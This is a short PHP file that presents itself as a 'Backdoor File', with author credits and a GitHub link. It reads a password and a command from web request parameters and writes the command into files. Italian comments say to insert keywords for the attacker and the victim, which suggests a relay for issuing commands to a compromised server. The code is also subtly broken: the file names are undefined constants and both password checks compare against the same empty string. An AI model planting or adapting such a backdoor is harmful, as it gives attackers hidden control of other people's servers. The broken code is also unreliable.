<?php

/*

- Backdoor File coded by @Subn3t
- Version: 1.0.4
- GitHub: https://github.com/gdsubn3t/Backdoor/
- Telegram: @subn3t
- You can use this code, but please give credits.
- Have fun and stay legal!


*/

if (isset($_REQUEST['pwd']) && isset($_REQUEST['cmd'])) {
	$pwd = $_REQUEST['pwd'];
	$cmd = $_REQUEST['cmd'];
}
if ($pwd == '') { // inserire parola chiave per l'attaccante
	file_put_contents(filecmd, $cmd);
}
if ($pwd == '') { // inserire parola chiave per la vittima
	file_put_contents(fileoutput, $cmd);
}

?>
